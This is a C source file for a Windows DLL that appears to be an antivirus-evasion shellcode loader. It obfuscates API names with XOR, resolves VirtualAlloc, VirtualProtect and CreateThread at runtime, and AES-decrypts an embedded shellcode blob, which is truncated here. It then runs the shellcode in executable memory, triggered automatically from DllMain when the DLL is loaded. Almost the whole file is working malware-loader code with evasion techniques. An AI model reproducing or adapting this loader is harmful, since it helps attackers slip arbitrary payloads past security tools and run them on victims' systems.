#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>
#include <wincrypt.h>
#include <psapi.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

# Generated using aesencrypt.py
unsigned char AESKey[] = {0x1b, ...};
unsigned char shellcode[] = {0x21, 0x22, 0xb1, ...};

unsigned int AESKeyLen = sizeof(AESKey);
unsigned int shellcodeLen = sizeof(shellcode);

/*------[TYPE DEFINITION OF ADVAPI32 EXPORTED FUNCTIONS]------*/
typedef BOOL(WINAPI* CryptAcquireContextW_DT)(HCRYPTPROV* phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
typedef BOOL(WINAPI* CryptCreateHash_DT)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH* phHash);
typedef BOOL(WINAPI* CryptHashData_DT)(HCRYPTHASH hHash, const BYTE* pbData, DWORD dwDataLen, DWORD dwFlags);
typedef BOOL(WINAPI* CryptDeriveKey_DT)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY* phKey);
typedef BOOL(WINAPI* CryptDecrypt_DT)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen);
typedef BOOL(WINAPI* CryptReleaseContext_DT)(HCRYPTPROV hProv, DWORD dwFlags);
typedef BOOL(WINAPI* CryptDestroyHash_DT)(HCRYPTHASH hHash);
typedef BOOL(WINAPI* CryptDestroyKey_DT)(HCRYPTKEY hKey);

/*------[TYPE DEFINITION OF KERNEL32 EXPORTED FUNCTIONS]------*/
typedef HMODULE (WINAPI * LoadLibraryA_DT)(LPCSTR lpLibFileName);
typedef LPVOID (WINAPI * VirtualAlloc_DT)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI * VirtualProtect_DT)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
typedef HANDLE (WINAPI * CreateThread_DT)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD (WINAPI * WaitForSingleObject_DT)(HANDLE hHandle, DWORD  dwMilliseconds);
typedef BOOL (WINAPI * CloseHandle_DT)(HANDLE hObject);

/*------[ENCRYPTED API CALLS STRINGS]------*/
// VirtualAlloc
unsigned char sVA[] = {0x0f, 0x33, 0x33, 0x2c, 0x34, 0x38, 0x2d, 0x1b, 0x19, 0x1f, 0x0a, 0x11, 0x33};
// VirtualProtect
unsigned char sVP[] = {0x0f, 0x33, 0x33, 0x2c, 0x34, 0x38, 0x2d, 0x0a, 0x07, 0x1c, 0x11, 0x17, 0x50, 0x46, 0x2e};
// CreateThread
unsigned char sCT[] = {0x1a, 0x28, 0x24, 0x39, 0x35, 0x3c, 0x15, 0x32, 0x07, 0x16, 0x04, 0x16, 0x33};
// WaitForSingleObject
unsigned char sWFSO[] = {0x0e, 0x3b, 0x28, 0x2c, 0x07, 0x36, 0x33, 0x09, 0x1c, 0x1d, 0x02, 0x1e, 0x56, 0x7d, 0x4c, 0x0e, 0x09, 0x0f, 0x3c, 0x58};
// CloseHandle
unsigned char sCH[] = {0x1a, 0x36, 0x2e, 0x2b, 0x24, 0x11, 0x20, 0x34, 0x11, 0x1f, 0x00, 0x72};
// LoadLibraryA
unsigned char sLLibA[] = {0x15, 0x35, 0x20, 0x3c, 0x0d, 0x30, 0x23, 0x28, 0x14, 0x01, 0x1c, 0x33, 0x33};
// CryptAcquireContextW
unsigned char sCrypto1[] = {0x1a, 0x28, 0x38, 0x28, 0x35, 0x18, 0x22, 0x2b, 0x00, 0x1a, 0x17, 0x17, 0x70, 0x5d, 0x40, 0x10, 0x09, 0x14, 0x3c, 0x0f, 0x41};
// CryptCreateHash
unsigned char sCrypto2[] = {0x1a, 0x28, 0x38, 0x28, 0x35, 0x1a, 0x33, 0x3f, 0x14, 0x07, 0x00, 0x3a, 0x52, 0x41, 0x46, 0x64};
// CryptHashData
unsigned char sCrypto3[] = {0x1a, 0x28, 0x38, 0x28, 0x35, 0x11, 0x20, 0x29, 0x1d, 0x37, 0x04, 0x06, 0x52, 0x32};
// CryptDeriveKey
unsigned char sCrypto4[] = {0x1a, 0x28, 0x38, 0x28, 0x35, 0x1d, 0x24, 0x28, 0x1c, 0x05, 0x00, 0x39, 0x56, 0x4b, 0x2e};
// CryptDecrypt
unsigned char sCrypto5[] = {0x1a, 0x28, 0x38, 0x28, 0x35, 0x1d, 0x24, 0x39, 0x07, 0x0a, 0x15, 0x06, 0x33};
// CryptReleaseContext
unsigned char sCrypto6[] = {0x1a, 0x28, 0x38, 0x28, 0x35, 0x0b, 0x24, 0x36, 0x10, 0x12, 0x16, 0x17, 0x70, 0x5d, 0x40, 0x10, 0x09, 0x14, 0x3c, 0x58};
// CryptDestroyHash
unsigned char sCrypto7[] = {0x1a, 0x28, 0x38, 0x28, 0x35, 0x1d, 0x24, 0x29, 0x01, 0x01, 0x0a, 0x0b, 0x7b, 0x53, 0x5d, 0x0c, 0x6c};
// CryptDestroyKey
unsigned char sCrypto8[] = {0x1a, 0x28, 0x38, 0x28, 0x35, 0x1d, 0x24, 0x29, 0x01, 0x01, 0x0a, 0x0b, 0x78, 0x57, 0x57, 0x64};

/*------[XOR FUNCTION]------*/
void xored(char *data, const char *key, size_t data_len, size_t key_len) {

    size_t i;
    for (i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

/*------[FUNTION USED TO DECRYPT AES-ENCRYPTED SHELLCODE]------*/
int AESDecrypt(char* payload, unsigned int payloadLen, char* key, unsigned int keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    HMODULE hAdvapi32;

    hAdvapi32 = GetModuleHandleW(L"Advapi32.dll");
    CryptAcquireContextW_DT pCryptAcquireContextW = (CryptAcquireContextW_DT)GetProcAddress(hAdvapi32, (char*)sCrypto1);
    if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }

    CryptCreateHash_DT pCryptCreateHash = (CryptCreateHash_DT)GetProcAddress(hAdvapi32, (char*)sCrypto2);
    if (!pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }

    CryptHashData_DT pCryptHashData = (CryptHashData_DT)GetProcAddress(hAdvapi32, (char*)sCrypto3);
    if (!pCryptHashData(hHash, (BYTE*)key, (DWORD)keyLen, 0)) {
        return -1;
    }

    CryptDeriveKey_DT pCryptDeriveKey = (CryptDeriveKey_DT)GetProcAddress(hAdvapi32, (char*)sCrypto4);
    if (!pCryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    CryptDecrypt_DT pCryptDecrypt = (CryptDecrypt_DT)GetProcAddress(hAdvapi32, (char*)sCrypto5);
    if (!pCryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payloadLen)) {
        return -1;
    }

    CryptReleaseContext_DT pCryptReleaseContext = (CryptReleaseContext_DT)GetProcAddress(hAdvapi32, (char*)sCrypto6);
    pCryptReleaseContext(hProv, 0);
    
    CryptDestroyHash_DT pCryptDestroyHash = (CryptDestroyHash_DT)GetProcAddress(hAdvapi32, (char*)sCrypto7);
    pCryptDestroyHash(hHash);

    CryptDestroyKey_DT pCryptDestroyKey = (CryptDestroyKey_DT)GetProcAddress(hAdvapi32, (char*)sCrypto8);
    pCryptDestroyKey(hKey);

    return 0;
}

extern __declspec(dllexport) void run(void) {
    void * ExecMem;
    DWORD oldProtect = 0;
    BOOL retVP;
    HANDLE hThread;
    HMODULE hKernel32 = GetModuleHandleW(L"Kernel32.dll");
    /*------[ENCRYPTION KEY]------*/
    char sk[] = "YZAXAYAZuser32.dllHXAYZ>H";

    /*------[DECRYPTING API FUNCTIONS]------*/
    xored((char *) sVA, sk, sizeof(sVA), strlen(sk));
    xored((char *) sVP, sk, sizeof(sVP), strlen(sk));
    xored((char *) sCT, sk, sizeof(sCT), strlen(sk));
    xored((char *) sWFSO, sk, sizeof(sWFSO), strlen(sk));
    xored((char *) sCH, sk, sizeof(sCH), strlen(sk));
    xored((char *) sLLibA, sk, sizeof(sLLibA), strlen(sk));
    xored((char *) sCrypto1, sk, sizeof(sCrypto1), strlen(sk));
    xored((char *) sCrypto2, sk, sizeof(sCrypto2), strlen(sk));
    xored((char *) sCrypto3, sk, sizeof(sCrypto3), strlen(sk));
    xored((char *) sCrypto4, sk, sizeof(sCrypto4), strlen(sk));
    xored((char *) sCrypto5, sk, sizeof(sCrypto5), strlen(sk));
    xored((char *) sCrypto6, sk, sizeof(sCrypto6), strlen(sk));
    xored((char *) sCrypto7, sk, sizeof(sCrypto7), strlen(sk));
    xored((char *) sCrypto8, sk, sizeof(sCrypto8), strlen(sk));

    // Allocating a buffer with the size of the shellcode
    VirtualAlloc_DT pVirtualAlloc = (VirtualAlloc_DT)GetProcAddress(hKernel32, (char*)sVA);
    ExecMem = pVirtualAlloc(NULL, shellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Loading Advapi32.dll DLL into memory
    LoadLibraryA_DT pLoadLibraryA = (LoadLibraryA_DT)GetProcAddress(hKernel32, (char*)sLLibA);
    pLoadLibraryA("Advapi32.dll");

    // Decrypting the shellcode
    AESDecrypt((char*)shellcode, shellcodeLen, (char*)AESKey, AESKeyLen);
    
    // Writing the shellcode in the allocated buffer
    RtlMoveMemory(ExecMem, shellcode, shellcodeLen);

    // Changing the protection of the allocated to be executable and readable
    VirtualProtect_DT pVirtualProtect = (VirtualProtect_DT) GetProcAddress(hKernel32, (char*)sVP);
    retVP = pVirtualProtect(ExecMem, shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);

    // Create a thread that will run our shellcode
    if (retVP != 0) {
        CreateThread_DT pCreateThread = (CreateThread_DT) GetProcAddress(hKernel32, (char*)sCT);
        hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ExecMem, 0, 0, NULL);

        WaitForSingleObject_DT pWaitForSingleObject = (WaitForSingleObject_DT) GetProcAddress(hKernel32, (char*)sWFSO);
        pWaitForSingleObject(hThread, 0);
    }

    // Close all handles in open state
    CloseHandle_DT pCloseHandle = (CloseHandle_DT) GetProcAddress(hKernel32, (char*)sCH);
    pCloseHandle(hThread);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
            run();
            break;
    }
    return TRUE;
}
